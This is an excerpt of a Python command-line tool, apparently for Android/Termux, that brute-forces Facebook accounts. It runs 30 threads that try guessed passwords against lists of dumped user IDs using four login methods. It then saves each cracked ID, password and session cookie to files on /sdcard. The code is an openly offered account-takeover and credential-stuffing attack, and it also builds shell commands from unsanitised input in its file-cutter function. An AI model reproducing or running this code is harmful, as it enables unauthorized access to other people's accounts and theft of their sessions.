...
from concurrent.futures import ThreadPoolExecutor as sarfrazSOJIB
from string import * 
...
sys.stdout.write('\x1b]2; SOJIB\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =  """            
.88b  d88.  .d8b.  d8888b. d888888b  .d8b.       
88'YbdP`88 d8' `8b 88  `8D   `88'   d8' `8b      
88  88  88 88ooo88 88oobY'    88    88ooo88      
88  88  88 88~~~88 88`8b      88    88~~~88      
88  88  88 88   88 88 `88.   .88.   88   88      
YP  YP  YP YP   YP 88   YD Y888888P YP   YP                                                                                                                                                                                                                                                                                       
\033[1;37m----------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m JOKAR SOJIB 
\033[1;37m[-] GITHUB    :\033[1;32m NOT FOUND 
\033[1;37m[-] VERSION   :\033[1;32m 1.0
\033[1;37m[-] STATUS    :\033[1;32m PRIVATE
\033[1;37m------------------------------------------------ 
LOVE IN NOT LIFE__💔___LOVE IS BARBADI
\033[1;37m------------------------------------------------ 
"""
def clear():
    os.system("clear")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SOJIB Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://wa.me/qr/4TENEWTXF3ZOB1')
        pass
    elif select =='F':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SOJIB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SOJIBb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SOJIBb};{ckkk}"
                    print(f"\r{R} [SOJIB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SOJIB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SOJIB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SOJIB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SOJIB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SOJIB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SOJIB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SOJIB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SOJIB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SOJIB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SOJIB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SOJIB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SOJIB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SOJIB_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazSOJIB(max_workers=30) as SOJIBworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SOJIBworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SOJIBworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SOJIBworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SOJIBworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SOJIB.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SOJIB.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SOJIB = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+SOJIB+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SOJIB )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back SOJIB Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SOJIB.txt\n') 
        filepath = input("Put File Name: ")
